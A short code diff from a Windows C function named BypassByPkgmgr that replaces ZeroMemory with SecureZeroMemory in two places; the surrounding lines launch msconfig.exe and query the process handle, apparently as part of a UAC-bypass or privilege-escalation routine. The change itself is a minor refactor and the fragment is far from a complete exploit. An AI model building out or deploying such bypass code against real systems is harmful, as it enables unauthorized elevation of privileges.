@@ -76,7 +76,7 @@ VOID BypassByPkgmgr
 	NTSTATUS Status = 0;
 
 	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\msconfig.exe", PkgMgrPath, MAX_PATH);
-	ZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
+    SecureZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
 	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
 	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 	ShellExeInfo.lpFile = PkgMgrPath;
@@ -87,7 +87,7 @@ VOID BypassByPkgmgr
 		goto END;
 	}
 
-	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+    SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
 	Status = NtQueryInformationProcess(ShellExeInfo.hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(ProcessInfo), &ReturnLength);
 	if (!NT_SUCCESS(Status)) {
 		goto END;
